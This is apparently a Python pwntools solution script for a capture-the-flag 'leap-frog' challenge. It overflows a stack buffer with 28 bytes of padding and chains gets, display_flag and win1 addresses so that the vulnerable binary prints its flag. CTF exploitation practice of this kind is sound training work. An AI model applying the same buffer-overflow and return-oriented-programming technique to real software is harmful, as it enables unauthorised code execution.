import os;os.environ['TMPDIR'] = os.path.join(os.environ['HOME'], 'tmp')
import pwn

remote_binary = "/problems/leap-frog_2_b375af7c48bb686629be6dd928a46897/rop"
#remote_binary = "./rop"

def segfault():
    conn = pwn.process(remote_binary)
    ofs = pwn.cyclic_find(pwn.p32(0x61616168)) # 28
    payload = b"A"*ofs + create_payload()
    try:
        conn.writelineafter("Enter your input> ", payload)
        conn.writeline(b"\x01\x01\x01") # set win1, win2 and win3 to true
        rsp = conn.readall(timeout=2)
        print(rsp)
    finally:
        conn.close()

def create_rop():
    rop = pwn.ROP(remote_binary)
    rop.leapA()
    rop.raw(0x8048690)
    rop.leap2(0xDEADBEEF)
    rop.display_flag()
    return rop.chain()

def create_payload():
    payload = b''
    elf = pwn.ELF(remote_binary, False)
    #payload += pwn.p32(0x8048430) # gets@plt
    payload += pwn.p32(elf.sym['gets']) # gets@plt
    payload += pwn.p32(elf.sym['display_flag'])
    payload += pwn.p32(elf.sym['win1'])
    return payload

segfault()
